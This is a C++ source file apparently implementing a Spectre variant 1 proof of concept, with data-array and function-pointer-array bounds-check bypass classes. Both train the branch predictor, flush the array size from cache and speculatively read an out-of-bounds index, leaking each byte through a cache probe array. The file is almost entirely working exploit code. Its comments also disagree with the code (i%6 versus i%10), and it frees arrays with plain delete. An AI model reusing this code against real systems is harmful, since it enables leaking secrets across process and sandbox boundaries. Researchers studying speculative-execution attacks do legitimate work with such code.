#include "spectre_boundcheck.h"

spectre::DataArray::DataArray(int n) {
    this->array_size = n;
    this->array = new uint8_t[n];
}

spectre::DataArray::~DataArray() {
    delete this->array;
}




void spectre::FunctionArray::noop(uint8_t a, const uint8_t* b, const uint8_t* c) {
}

spectre::FunctionArray::FunctionArray(int n) {
    this->array_size = n;
    this->array = new function_ptr_t[n];
    for (int i=0; i<n; i++) {
        this->array[i] = FunctionArray::noop;
    }
}

spectre::FunctionArray::~FunctionArray() {
    delete this->array;
}





void spectre::DataArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    size_t malicious_index = data - this->data_array.array;
    size_t max_training_index = this->data_array.array_size;

    for (int i = 9; i >= 0; i--) {
        size_t training_index = (mask + i) % max_training_index;
        libflush.flush(&this->data_array.array_size);
        fence();

        // Bit twiddling to set index=training_index if i%6!=0 or malicious_x if i%6==0
        // Avoid jumps in case those tip off the branch predictor
        size_t index = ((i % 10) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
        index = (index | (index >> 16));  // Set index=-1 if i&6=0, else index=0
        index = training_index ^ (index & (malicious_index ^ training_index));

        if (index < this->data_array.array_size) {
            uint8_t value = this->data_array.array[index];
            volatile uint8_t tmp = cache_probe[(mask & value) * CACHE_LINE_SIZE];
        }
    }
}




void spectre::FunctionArrayBoundCheckBypass::exploit(uint8_t mask, const uint8_t* target_ptr, const uint8_t* cache_probe) {
    uint8_t value = *target_ptr;
    volatile uint8_t tmp = cache_probe[(value & mask) * CACHE_LINE_SIZE];
}

void spectre::FunctionArrayBoundCheckBypass::probe_bit(uint8_t mask, const uint8_t* data, const uint8_t* cache_probe) {
    FunctionArray::function_ptr_t fake_array[] = {
        FunctionArrayBoundCheckBypass::exploit
    };

    size_t malicious_index = fake_array - this->function_array.array;
    size_t max_training_index = this->function_array.array_size;

    for (int i = 9; i >= 0; i--) {
        size_t training_index = (mask + i) % max_training_index;
        libflush.flush(&this->function_array.array_size);
        fence();

        // Bit twiddling to set index=training_index if i%6!=0 or malicious_x if i%6==0
        // Avoid jumps in case those tip off the branch predictor
        size_t index = ((i % 10) - 1) & ~0xFFFF;  // Set index=FFF.FF0000 if i%6==0, else index=0
        index = (index | (index >> 16));  // Set index=-1 if i&6=0, else index=0
        index = training_index ^ (index & (malicious_index ^ training_index));

        if (index < this->function_array.array_size) {
            this->function_array.array[index](mask, data, cache_probe);
        }
    }
}
